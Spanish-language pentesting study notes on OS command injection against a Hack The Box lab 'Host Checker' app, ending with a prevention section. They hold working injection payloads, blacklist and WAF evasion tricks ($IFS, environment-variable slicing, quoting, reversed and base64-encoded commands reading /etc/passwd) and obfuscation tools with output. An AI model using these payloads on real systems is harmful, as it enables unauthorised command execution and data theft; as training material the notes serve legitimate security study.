---
title: Command Injection
date: 2025-11-6 11:00:00 +0000
categories: [Web, apuntes]
tags: [pentesting, web, command injection]
image:
  path: /assets/img/posts/command-injection/cabecera.png
  alt: cabecera
description: >
   Injección de comandos

pin: false  
toc: true   
math: false 
mermaid: false 
---


Una vulnerabilidad de inyección de comandos es uno de los tipos de vulnerabilidades más críticos.

Nos permite ejecutar comandos del sistema directamente en el servidor de alojamiento back-end, lo que podría comprometer toda la red. Si una aplicación web utiliza entradas controladas por el usuario para ejecutar un comando del sistema en el servidor back-end con el fin de recuperar y devolver una salida específica, es posible que podamos inyectar una carga maliciosa para revertir el comando previsto y ejecutar nuestros propios comandos.


## Métodos

|Operador de Inyección|Carácter de Inyección|Carácter Codificado en URL|Comando Ejecutado|
|---|---|---|---|
|Punto y coma|;|%3b|Ambos|
|Nueva línea|\n|%0a|Ambos|
|En segundo plano|&|%26|Ambos (generalmente se muestra la segunda salida primero)|
|Tubería (Pipe)|\||%7c|Ambos (solo se muestra la segunda salida)|
|AND|&&|%26%26|Ambos (solo si el primero tiene éxito)|
|OR|\||%7c%7c|Segundo (solo si el primero falla)|
|Sub-Shell|``|%60%60|Ambos (solo en Linux)|
|Sub-Shell|$()|%24%28%29|Ambos (solo en Linux)|
Podemos utilizar cualquiera de estos operadores para inyectar otro comando, de modo que se ejecuten ambos comandos o uno de ellos. Escribiríamos nuestra entrada esperada (por ejemplo, una IP), luego utilizaríamos cualquiera de los operadores anteriores y, a continuación, escribiríamos nuestro nuevo comando.

En general, para la inyección de comandos básica, todos estos operadores se pueden utilizar para inyectar comandos independientemente del lenguaje de la aplicación web, el marco de trabajo o el servidor back-end. Por lo tanto, si estamos inyectando en una aplicación web PHP que se ejecuta en un servidor Linux, o en una aplicación web .Net que se ejecuta en un servidor back-end Windows, o en una aplicación web NodeJS que se ejecuta en un servidor back-end macOS, nuestras inyecciones deberían funcionar independientemente.

La única excepción puede ser el punto y coma ; que no funcionará si el comando se ejecuta con la línea de comandos de Windows (CMD), pero sí funcionará si se ejecuta con Windows PowerShell.


## Injección de comandos

![image](/assets/img/posts/command-injection/20251104212103.png)
Como podemos ver, la aplicación web rechazó nuestra entrada, ya que parece que solo acepta entradas en formato IP. Sin embargo, por el aspecto del mensaje de error, parece que se origina en el front-end y no en el back-end. 

Para poder ver el envío del comando primero debemos hacer una prueba legítima del servicio. 

![image](/assets/img/posts/command-injection/20251104212401.png)

### Bypass de validación front-end

Aquí tenemos numerosos métodos como utilizar burp o similares pero la forma más sencilla es copiar la petitición directamente del navegador como curl y modificar los datos.

```shell
curl 'http://94.237.49.90:40349/' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.8' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'DNT: 1' \
  -H 'Origin: http://94.237.49.90:40349' \
  -H 'Referer: http://94.237.49.90:40349/' \
  -H 'Sec-GPC: 1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36' \
  --data-raw 'ip=127.0.0.1;+whoami' \
  ```

Aquí si podremos inyectar el ; al final de la ip.

Como respuesta tenemos:

```html
      <input type="text" name="ip" placeholder="127.0.0.1" pattern="^((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$">
      <button type="submit">Check</button>
    </form>

    <p>
    <pre>
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.020/0.020/0.020/0.000 ms
www-data
</pre>
    </p>

  </div>
  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js'></script>
</body>
```


## Otros operadores de injección

### AND

```
ping -c 1 127.0.0.1 && whoami 
```

### OR

El operador OR solo ejecuta el segundo comando si el primero falla. Esto puede resultarnos útil en casos en los que nuestra inyección rompería el comando original sin tener una forma sólida de hacer que ambos comandos funcionen. Por lo tanto, el uso del operador OR haría que nuestro nuevo comando se ejecutara si el primero fallara.

```shell
ping -c 1 127.0.0.1 || whoami 

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.635/0.635/0.635/0.000 ms
```

Esto se debe al funcionamiento de los comandos bash. Como el primer comando devuelve el código de salida 0, que indica que se ha ejecutado correctamente, el comando bash se detiene y no intenta ejecutar el otro comando. Solo intentaría ejecutar el otro comando si el primero fallara y devolviera el código de salida 1.

```bash
ping -c 1 || whoami

ping: usage error: Destination address required 
ww-data
```

Estos operadores se pueden utilizar para varios tipos de inyecciones, como inyecciones SQL, inyecciones LDAP, XSS, SSRF, XXE, etc.

|Tipo de Inyección|Operadores|
|---|---|
|Inyección SQL|' , ; -- /* */|
|Inyección de Comandos|; &&|
|Inyección LDAP|* ( ) &|
|Inyección XPath|' or and not substring concat count|
|Inyección de Comandos del SO|; &|
|Inyección de Código|' ; -- /* */ $() ${} #{} %{} ^|
|Traversal de Directorios / Rutas de Archivos|../ ..\ %00|
|Inyección de Objetos|; &|
|Inyección XQuery|' ; -- /* */|
|Inyección Shellcode|\x \u %u %n|
|Inyección en Cabeceras|\n \r\n \t %0d %0a %09|

## Identificar filtros

Otro tipo de mitigación de inyecciones consiste en utilizar caracteres y palabras incluidos en una lista negra en el back-end para detectar intentos de inyección y denegar la solicitud si alguna de ellas los contiene. Otra capa adicional es el uso de cortafuegos de aplicaciones web (WAF), que pueden tener un alcance más amplio y diversos métodos de detección de inyecciones, además de prevenir otros ataques como las inyecciones SQL o los ataques XSS.

### Detección de filtros/WAF

![image](/assets/img/posts/command-injection/20251104215032.png)

Esto indica que algo que enviamos activó un mecanismo de seguridad que rechazó nuestra solicitud. Este mensaje de error puede mostrarse de varias formas. En este caso, lo vemos en el campo donde se muestra el resultado, lo que significa que fue detectado y bloqueado por la propia aplicación web PHP. Si el mensaje de error mostrara una página diferente, con información como nuestra IP y nuestra solicitud, esto podría indicar que fue rechazado por un WAF.

Si analizamos el comando que intenamos inyectar:

- Un carácter de punto y coma ;

- Un carácter de espacio

- Un comando whoami

Por lo tanto, la aplicación web detectó un carácter incluido en la lista negra o un comando incluido en la lista negra, o ambos.

### Carácteres en blacklist

Una aplicación web puede tener una lista de caracteres prohibidos, y si el comando los contiene, rechazará la solicitud. El código PHP puede tener un aspecto similar al siguiente:

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

Si algún carácter de la cadena que enviamos coincide con un carácter de la lista negra, nuestra solicitud es denegada. Antes de intentar eludir el filtro, debemos tratar de identificar qué carácter ha provocado la denegación de la solicitud.

#### Identificar el carácter

Reduzcamos nuestra solicitud a un carácter cada vez y veamos cuándo se bloquea. Sabemos que el payload (127.0.0.1) funciona, así que empecemos añadiendo el punto y coma (127.0.0.1;):

![image](/assets/img/posts/command-injection/20251104215417.png)

Seguimos obteniendo una entrada no válida, lo que significa que el punto y coma está en la lista negra. 

### Bypass de operadores filtrados

Veremos que la mayoría de los operadores de inyección están efectivamente en la lista negra. Sin embargo, el carácter de nueva línea no suele estar en la lista negra, ya que puede ser necesario en el propio payload. Sabemos que el carácter de nueva línea funciona para añadir nuestros comandos tanto en Linux como en Windows, así que probemos a utilizarlo como nuestro operador de inyección.

![image](/assets/img/posts/command-injection/20251104221124.png)

Como podemos ver, aunque nuestrpayload incluía un carácter de nueva línea, nuestra solicitud no fue denegada y obtuvimos el resultado del comando ping, lo que significa que este carácter no está en la lista negra y podemos utilizarlo como nuestro operador de inyección. Comencemos por analizar cómo eludir un carácter que suele estar en la lista negra: el **espacio**.

### Bypass de espacios

![image](/assets/img/posts/command-injection/20251104221240.png)

Como podemos ver, seguimos obteniendo un mensaje de error de entrada no válida, lo que significa que aún tenemos que omitir otros filtros. Por lo tanto, como hicimos antes, añadamos solo el siguiente carácter (que es un espacio) y veamos si provoca el rechazo de la solicitud:

![image](/assets/img/posts/command-injection/20251104221305.png)

Como podemos ver, el carácter de espacio también está incluido en la lista negra. El espacio es un carácter que suele incluirse en la lista negra, especialmente si la entrada no debe contener espacios, como una dirección IP, por ejemplo. Sin embargo, hay muchas formas de añadir un carácter de espacio sin utilizar realmente el carácter de espacio.

#### Tabs

Usar tabulaciones (%09) en lugar de espacios es una técnica que puede funcionar, ya que tanto Linux como Windows aceptan comandos con tabulaciones entre argumentos, y se ejecutan de la misma manera. Por lo tanto, intentemos usar una tabulación en lugar del carácter de espacio (127.0.0.1%0a%09) y veamos si nuestra solicitud es aceptada.

![image](/assets/img/posts/command-injection/20251104221611.png)

#### $IFS

El uso de la variable de entorno ($IFS) de Linux también puede funcionar, ya que su valor predeterminado es un espacio y una tabulación, lo que funcionaría entre los argumentos del comando. Por lo tanto, si utilizamos ${IFS} donde deberían estar los espacios, la variable debería sustituirse automáticamente por un espacio y nuestro comando debería funcionar.

![image](/assets/img/posts/command-injection/20251104221900.png)

#### Brace expansion

Hay muchos otros métodos que podemos utilizar para evitar los filtros de espacio. Por ejemplo, podemos usar la función Bash Brace Expansion, que añade automáticamente espacios entre los argumentos envueltos entre llaves, de la siguiente manera;

```shell
{ls,-la} 

total 0 
drwxr-xr-x 1 21y4d home 0 Jul 13 07:37 .
drwxr-xr-x 1 21y4d home 0 Jul 13 13:01 ..
```

Como podemos ver, el comando se ejecutó correctamente sin espacios. 

Podemos utilizar el mismo método para eludir los filtros de inyección de comandos, utilizando la expansión de llaves en los argumentos de nuestros comandos, como (127.0.0.1%0a{ls,-la}). Para descubrir más formas de eludir los filtros de espacios, podemos recurrir a la página [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) para ver cómo escribir comandos sin espacios.


### Bypass de otros carácteres

Además de los operadores de inserción y los caracteres de espacio, un carácter que suele aparecer en las listas negras es la barra (/) o la barra invertida (\), ya que es necesario para especificar directorios en Linux o Windows. Podemos utilizar varias técnicas para producir cualquier carácter que queramos evitando el uso de caracteres incluidos en las listas negras.

#### Linux

Hay muchas técnicas que podemos utilizar para incluir barras en nuestra carga útil. Una de estas técnicas que podemos utilizar para sustituir barras (o cualquier otro carácter) es a través de las variables de entorno de Linux, como hicimos con ${IFS}. 

Mientras que ${IFS} se sustituye directamente por un espacio, no existe ninguna variable de entorno para las barras o los puntos y comas. Sin embargo, estos caracteres pueden utilizarse en una variable de entorno, y podemos especificar el inicio y la longitud de nuestra cadena para que coincida exactamente con este carácter.

Por ejemplo, si observamos la variable de entorno $PATH en Linux, puede tener un aspecto similar al siguiente:

```bash
$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

Por lo tanto, si comenzamos en el carácter 0 y solo tomamos una cadena de longitud 1, terminaremos solo con el carácter /, que podemos usar en nuestro payload:

```bash
$ echo ${PATH:0:1} /
```

Si usamos esto en nuestro payload hay que tener en cuenta que el "echo" no es necesario.

Podemos hacer lo mismo con las variables de entorno $HOME o $PWD. También podemos utilizar el mismo concepto para obtener un carácter de punto y coma, que se utilizará como operador de inyección. Por ejemplo, el siguiente comando nos da un punto y coma:

```bash
$ echo ${LS_COLORS:10:1} ;
```

El comando printenv imprime todas las variables de entorno en Linux, por lo que podemos buscar cuáles pueden contener caracteres útiles y luego intentar reducir la cadena solo a ese carácter.

#### Windows

El mismo concepto funciona también en Windows. Por ejemplo, para producir una barra inclinada en la línea de comandos de Windows (CMD), podemos repetir una variable de Windows (%HOMEPATH% -> \Users\student), y luego especificar una posición inicial (~6 -> \student) y, por último, especificar una posición final negativa, que en este caso es la longitud del nombre de usuario student (-7 -> \) :

```cmd
C:\htb> echo %HOMEPATH:~6,-7%

\
```

Podemos lograr lo mismo utilizando las mismas variables en Windows PowerShell. Con PowerShell, una palabra se considera una matriz, por lo que tenemos que especificar el índice del carácter que necesitamos. Como solo necesitamos un carácter, no tenemos que especificar las posiciones inicial y final.

```powershell
PS C:\htb> $env:HOMEPATH[0] 

\
```

También podemos utilizar el comando Get-ChildItem Env: PowerShell para imprimir todas las variables de entorno y, a continuación, seleccionar una de ellas para generar el carácter que necesitamos. Intenta ser creativo y busca diferentes comandos para generar caracteres similares.

### Character shifting | Desplazamiento de carácteres

Hay otras técnicas para producir los caracteres necesarios sin utilizarlos, como desplazar caracteres. Por ejemplo, el siguiente comando de Linux desplaza el carácter que pasamos en 1. Así que, todo lo que tenemos que hacer es encontrar el carácter en la tabla ASCII que está justo antes del carácter que necesitamos (podemos obtenerlo con **man ascii**) y luego añadirlo en lugar de `[` en el ejemplo siguiente. De esta manera, el último carácter impreso sería el que necesitamos.

```bash
$ man ascii     # \ is on 92, before it is [ on 91
$ echo $(tr '!-}' '"-~'<<<[)

\
```

#### Ejemplo

```bash
curl 'http://83.136.249.223:41107/' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.7' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'DNT: 1' \
  -H 'Origin: http://83.136.249.223:41107' \
  -H 'Referer: http://83.136.249.223:41107/' \
  -H 'Sec-GPC: 1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36' \
  --data-raw 'ip=127.0.0.1%0als${IFS}${PATH:0:1}home' \
  --insecure
```

```html
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Host Checker</title>
  <link rel="stylesheet" href="./style.css">

</head>

<body>
  <div class="main">
    <h1>Host Checker</h1>

    <form method="post" action="">
      <label>Enter an IP Address</label>
      <input type="text" name="ip" placeholder="127.0.0.1" pattern="^((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$">
      <button type="submit">Check</button>
    </form>

    <p>
    <pre>
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.016 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.016/0.016/0.016/0.000 ms
1nj3c70r
</pre>
    </p>

  </div>
  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js'></script>

</body>

</html>%  
```


## Bypass de comandos filtrados

Hemos visto varios métodos para eludir los filtros de un solo carácter. Sin embargo, existen diferentes métodos para eludir los comandos incluidos en listas negras. Una lista negra de comandos suele consistir en un conjunto de palabras, y si logramos ofuscar nuestros comandos y hacer que parezcan diferentes, es posible que podamos eludir los filtros.

Existen varios métodos de ofuscación de comandos que varían en complejidad.


En el siguiente ejemplo hemos logrado eludir con éxito el filtro de caracteres para los caracteres de espacio y punto y coma en nuestro payload, pero si intentamos ejecutar el comando "whoami" veremos que no es posible ya que es filtrado.

![image](/assets/img/posts/command-injection/20251105210425.png)

Ejemplo del código de filtrado:

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

Como podemos ver, comprueba cada palabra introducida por el usuario para ver si coincide con alguna de las palabras de la lista negra. Sin embargo, este código busca una coincidencia exacta con el comando proporcionado, por lo que si enviamos un comando ligeramente diferente, es posible que no se bloquee por lo que podemos utilizar varias técnicas de ofuscación que ejecutarán nuestro comando sin utilizar la palabra exacta del comando.


### Linux & Windows

Una técnica de ofuscación muy común y sencilla consiste en insertar ciertos caracteres dentro de nuestro comando que suelen ser ignorados por los interpretadores de comandos como Bash o PowerShell y que ejecutarán el mismo comando como si no estuvieran ahí. Algunos de estos caracteres son la comilla simple ' y la comilla doble ", además de algunos otros.

Las más fáciles de usar son las comillas, y funcionan tanto en servidores Linux como Windows. 

```shell
$ w'h'o'am'i

$ w"h"o"am"i
```

Lo importante es recordar que no podemos mezclar tipos de comillas y que el número de comillas debe ser par.

![image](/assets/img/posts/command-injection/20251105211014.png)

### Linux only

Podemos insertar algunos otros caracteres exclusivos de Linux en medio de los comandos, y el shell bash los ignorará y ejecutará el comando. Estos caracteres incluyen la barra invertida \ y el carácter de parámetro posicional $@. Esto funciona exactamente igual que con las comillas, pero en este caso, el número de caracteres no tiene que ser par, y podemos insertar solo uno de ellos.

```bash
who$@ami
w\ho\am\i
```

### Windows only

También hay algunos caracteres exclusivos de Windows que podemos insertar en medio de los comandos y que no afectan al resultado, como el carácter de intercalación (^).

```cmd
C:\windows> who^ami
```

#### Ejemplo

```http
POST / HTTP/1.1
Host: 94.237.49.128:32875
Content-Length: 79
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://94.237.49.128:32875
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://94.237.49.128:32875/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

ip=127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```

```html
HTTP/1.1 200 OK
Date: Wed, 05 Nov 2025 20:51:43 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 918
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Host Checker</title>
  <link rel="stylesheet" href="./style.css">

</head>

<body>
  <div class="main">
    <h1>Host Checker</h1>

    <form method="post" action="">
      <label>Enter an IP Address</label>
      <input type="text" name="ip" placeholder="127.0.0.1" pattern="^((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$">
      <button type="submit">Check</button>
    </form>

    <p>
    <pre>
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.013 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.013/0.013/0.013/0.000 ms
HTB{b451c_f1l73r5_w0n7_570p_m3}
</pre>
    </p>

  </div>
  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js'></script>

</body>

</html>
```

## Técnicas avanzadas

En algunos casos, es posible que nos enfrentemos a soluciones de filtrado avanzadas, como los cortafuegos de aplicaciones web (WAF), y es posible que las técnicas básicas de evasión no funcionen necesariamente. En tales ocasiones, podemos utilizar técnicas más avanzadas, que hacen que la detección de los comandos inyectados sea mucho menos probable.

### Case manipulation | Manipulación de mayus,minus

Una técnica de ofuscación de comandos que podemos utilizar es la manipulación de mayúsculas y minúsculas, como invertir las mayúsculas y minúsculas de un comando (por ejemplo, WHOAMI) o alternar entre mayúsculas y minúsculas (por ejemplo, WhOaMi). Esto suele funcionar porque es posible que una lista negra de comandos no compruebe las diferentes variaciones de mayúsculas y minúsculas de una sola palabra, ya que los sistemas Linux distinguen entre mayúsculas y minúsculas.

Si se trata de un servidor Windows, podemos cambiar las mayúsculas y minúsculas de los caracteres del comando y enviarlo. En Windows, los comandos para PowerShell y CMD no distinguen entre mayúsculas y minúsculas, lo que significa que ejecutarán el comando independientemente de cómo esté escrito.

```powershell
C:\windows> WhOaMi
```

Sin embargo, cuando se trata de Linux y un shell bash, que distinguen entre mayúsculas y minúsculas, tenemos que ser un poco creativos y encontrar un comando que convierta el comando en una palabra totalmente en minúsculas.

```bash
root@root[/root]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi") 

root
```

Como podemos ver, el comando funcionó, aunque la palabra que proporcionamos fue (WhOaMi). Este comando utiliza tr para sustituir todos los caracteres en mayúscula por caracteres en minúscula, lo que da como resultado un comando con todos los caracteres en minúscula.

![image](/assets/img/posts/command-injection/20251105230944.png)

Otros ejemplos pueden ser:

```bash
$(a="WhOaMi";printf %s "${a,,}")
```


### Comandos invertidos

Consiste en invertir los comandos y tener una plantilla de comandos que los cambie de nuevo y los ejecute en tiempo real. En este caso, escribiremos imaohw en lugar de whoami para evitar activar el comando incluido en la lista negra.

Podemos ser creativos con estas técnicas y crear nuestros propios comandos Linux/Windows que, al final, ejecuten el comando sin contener nunca las palabras reales del comando. Primero, tendríamos que obtener la cadena invertida de nuestro comando en nuestro terminal.

```bash
$ echo 'whoami' | rev

imaohw
```


A continuación, podemos ejecutar el comando original invirtiéndolo en un subshell ($()).

```bash
$ $(rev<<<'imaohw')

root
```

![image](/assets/img/posts/command-injection/20251105231309.png)

Lo mismo se puede aplicar en Windows. Primero podemos invertir una cadena:

```powershell
PS C:\htb> "whoami"[-1..-20] -join '' 

imaohw
```

Ahora podemos utilizar el siguiente comando para ejecutar una cadena invertida con un subshell de PowerShell (iex «$()»):

```powershell
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')" 

administrator
```


### Comandos codificados

Son comandos que contienen caracteres filtrados o caracteres que pueden ser decodificados por el servidor. Esto puede hacer que el comando se estropee antes de llegar al shell y, finalmente, no se ejecute. En lugar de copiar un comando existente en línea, esta vez intentaremos crear nuestro propio comando de ofuscación único. De esta manera, es mucho menos probable que sea rechazado por un filtro o un WAF. El comando que creemos será único para cada caso, dependiendo de los caracteres permitidos y del nivel de seguridad del servidor.

Podemos utilizar varias herramientas de codificación, como base64 (para la codificación b64) o xxd (para la codificación hexadecimal). 

```bash
$ echo -n 'cat /etc/passwd | grep 33' | base64 Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

Ahora podemos crear un comando que descodifique la cadena codificada en un subshell ($()), y luego pasarla a bash para que se ejecute (es decir, bash<<<).

```bash
$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) 

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

Como podemos ver, el comando anterior se ejecuta perfectamente. No hemos incluido ningún carácter filtrado y hemos evitado los caracteres codificados que podrían provocar que el comando no se ejecutara.

Estamos utilizando <<< para evitar el uso de la barra vertical |, que es un carácter filtrado.

![image](/assets/img/posts/command-injection/20251105231917.png)

Utilizamos la misma técnica con Windows. 

```powershell
PS C:\windows> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```

También podemos lograr lo mismo en Linux, pero tendríamos que convertir la cadena de utf-8 a utf-16 antes de convertirla a base64.

```bash
echo -n whoami | iconv -f utf-8 -t utf-16le | base64 

dwBoAG8AYQBtAGkA
```

Por último, podemos descodificar la cadena b64 y ejecutarla con un subshell de PowerShell (iex «$()»).

```powershell
PS C:\windows> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))" 

administrator
```


## Herramientas de evasión

### Linux - Bashfuscator

Una herramienta útil que podemos utilizar para ofuscar comandos bash es Bashfuscator.

```bash
$ git clone https://github.com/Bashfuscator/Bashfuscator 
$ cd Bashfuscator 
$ pip3 install setuptools==65 
$ python3 setup.py install --user
```

Una vez que tengamos la herramienta configurada, podemos empezar a utilizarla desde el directorio ./bashfuscator/bin/. Hay muchos indicadores que podemos utilizar con la herramienta para ajustar nuestro comando ofuscado final, como podemos ver en el menú de ayuda -h.

```bash
$ ./bashfuscator -c 'cat /etc/passwd' 

[+] Mutators used: Token/ForCode -> Command/Reverse 
[+] Payload: ${*/+27\[X\(} ...SNIP... ${*~} 
[+] Payload size: 1664 characters
```

Sin embargo, al ejecutar la herramienta de esta manera, se seleccionará aleatoriamente una técnica de ofuscación, lo que puede generar un comando con una longitud que varía desde unos pocos cientos de caracteres hasta más de un millón. Por lo tanto, podemos utilizar algunas de las opciones del menú de ayuda para generar un comando ofuscado más corto y sencillo.

```bash
$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1 

[+] Mutators used: Token/ForCode 
[+] Payload: eval "$(W0=(w \ t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)" 
[+] Payload size: 104 characters
```

```bash
$ bash -c 'eval "$(W0=(w \ t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"' 

root:x:0:0:root:/root:/bin/bash ...SNIP...
```

Podemos ver que el comando ofuscado funciona, aunque parece completamente ofuscado y no se parece en nada a nuestro comando original. También podemos observar que la herramienta utiliza muchas técnicas de ofuscación.

### Windows - DOSfuscation

También hay una herramienta muy similar que podemos usar para Windows llamada DOSfuscation. A diferencia de Bashfuscator, esta es una herramienta interactiva, ya que la ejecutamos una vez e interactuamos con ella para obtener el comando ofuscado deseado. 

```powershell
PS C:\user> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git PS C:\user> cd Invoke-DOSfuscation PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1 
PS C:\user> Invoke-DOSfuscation 
Invoke-DOSfuscation> help 

HELP MENU :: Available options shown below: 
[*] Tutorial of how to use this tool TUTORIAL 
...SNIP... 

Choose one of the below options: 
[*] BINARY Obfuscated binary syntax for cmd.exe & powershell.exe 
[*] ENCODING Environment variable encoding 
[*] PAYLOAD Obfuscated payload via DOSfuscation
```


## Prevención

Siempre debemos evitar el uso de funciones que ejecuten comandos del sistema, especialmente si utilizamos entradas de usuario con ellas. Incluso cuando no introducimos directamente entradas de usuario en estas funciones, un usuario puede influir indirectamente en ellas, lo que eventualmente puede dar lugar a una vulnerabilidad de inyección de comandos.

En lugar de utilizar funciones de ejecución de comandos del sistema, debemos utilizar funciones integradas que realicen la funcionalidad necesaria, ya que los lenguajes de back-end suelen tener implementaciones seguras de este tipo de funcionalidades. 

Por ejemplo, supongamos que queremos comprobar si un host concreto está activo con PHP. En ese caso, podemos utilizar la función fsockopen, que no debería ser explotable para ejecutar comandos arbitrarios del sistema.

Si necesitáramos ejecutar un comando del sistema y no encontráramos ninguna función integrada que realizara la misma funcionalidad, nunca deberíamos utilizar directamente la entrada del usuario con estas funciones, sino que siempre deberíamos validar y sanear la entrada del usuario en el back-end. Además, deberíamos intentar limitar al máximo el uso de este tipo de funciones y utilizarlas solo cuando no exista una alternativa integrada a la funcionalidad que necesitamos.

### Validación de entradas

Ya sea que utilicemos funciones integradas o funciones de ejecución de comandos del sistema, siempre debemos validar y luego sanitizar la entrada del usuario. La validación de la entrada se realiza para garantizar que coincida con el formato esperado para la entrada, de modo que la solicitud se rechace si no coincide. En nuestra aplicación web de ejemplo, vimos que se intentó validar la entrada en el front-end, pero la validación de la entrada debe realizarse tanto en el front-end como en el back-end.


En PHP, al igual que en muchos otros lenguajes de desarrollo web, hay filtros integrados para una variedad de formatos estándar, como correos electrónicos, URL e incluso IP, que se pueden utilizar con la función filter_var.

### Sanitización de entradas

La parte más importante para prevenir cualquier vulnerabilidad de inyección es la desinfección de entradas, lo que significa eliminar cualquier carácter especial innecesario de la entrada del usuario. La desinfección de entradas siempre se realiza después de la validación de entradas. Incluso después de validar que la entrada proporcionada por el usuario tiene el formato adecuado, debemos realizar la desinfección y eliminar cualquier carácter especial que no sea necesario para el formato específico, ya que hay casos en los que la validación de entradas puede fallar (por ejemplo, una expresión regular incorrecta).

```php
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
```

Como podemos ver, la expresión regular anterior solo permite caracteres alfanuméricos (A-Za-z0-9) y permite un carácter de punto (.) según lo requerido para las direcciones IP. Cualquier otro carácter se eliminará de la cadena. Lo mismo se puede hacer con JavaScript.

```javascript
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```

O node.js

```js
import DOMPurify from 'dompurify';
var ip = DOMPurify.sanitize(ip);
```

En ciertos casos, es posible que queramos permitir todos los caracteres especiales (por ejemplo, comentarios de usuarios), entonces podemos usar la misma función filter_var que usamos con la validación de entrada y usar el filtro escapeshellcmd para escapar cualquier carácter especial, de modo que no puedan causar ninguna inyección. Para NodeJS, podemos utilizar simplemente la función escape(ip). 

### Configuración del servidor

Por último, debemos asegurarnos de que nuestro servidor back-end esté configurado de forma segura para reducir el impacto en caso de que el servidor web se vea comprometido. Algunas de las configuraciones que podemos implementar son:

- Utilizar el cortafuegos de aplicaciones web integrado en el servidor web (por ejemplo, en Apache mod_security), además de un WAF externo (por ejemplo, Cloudflare, Fortinet, Imperva...).

- Cumplir con el principio del mínimo privilegio (PoLP) ejecutando el servidor web como un usuario con pocos privilegios (por ejemplo, www-data).

- Evitar que el servidor web ejecute determinadas funciones (por ejemplo, en PHP disable_functions=system, etc.).

